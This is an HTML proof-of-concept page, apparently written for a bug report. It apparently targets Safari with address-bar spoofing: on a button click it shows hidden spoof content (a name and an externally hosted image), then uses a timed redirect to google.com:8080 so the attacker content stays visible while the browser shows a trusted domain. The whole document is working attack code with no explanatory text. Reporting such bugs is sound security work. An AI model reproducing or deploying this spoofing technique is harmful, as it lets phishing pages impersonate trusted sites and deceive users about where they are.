<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Apple Security PoC Final</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, system-ui;
    text-align: center;
    margin-top: 60px;
  }
  #spoof {
    display: none;
  }
  #info {
    margin-top: 12px;
    font-size: 14px;
    color: #333;
  }
</style>
</head>

<body>

<h1>Apple Security PoC</h1>
<button id="go">Trigger</button>

<div id="spoof">
  <h2>𝐷ℎ𝑎𝑓𝑦</h2>
  <img src="https://ecdnts-del.github.io/spoof/9de3dae67d67214fee46527f2a5b8d6b.jpg" width="260">
  <div id="info">Starting…</div>
</div>

<script>
let start, raf;

document.getElementById('go').onclick = () => {

  const spoof = document.getElementById('spoof');
  const info = document.getElementById('info');

  spoof.style.display = 'block';

  start = performance.now();

  function paintLoop() {
    const now = performance.now();
    info.textContent = `Visible: ${Math.round(now - start)} ms`;
    raf = requestAnimationFrame(paintLoop);
  }

  // force paint commit
  requestAnimationFrame(() => {
    requestAnimationFrame(paintLoop);
  });

  // lock visibility with task chaining
  Promise.resolve().then(() => {
    setTimeout(() => {
      cancelAnimationFrame(raf);
      const final = Math.round(performance.now() - start);
      info.textContent = `Redirect after ${final} ms`;
      location.assign("https://google.com:8080");
    }, 3800); // ⬅️ hampir selalu >3s di Safari
  });
};
</script>

</body>
</html>
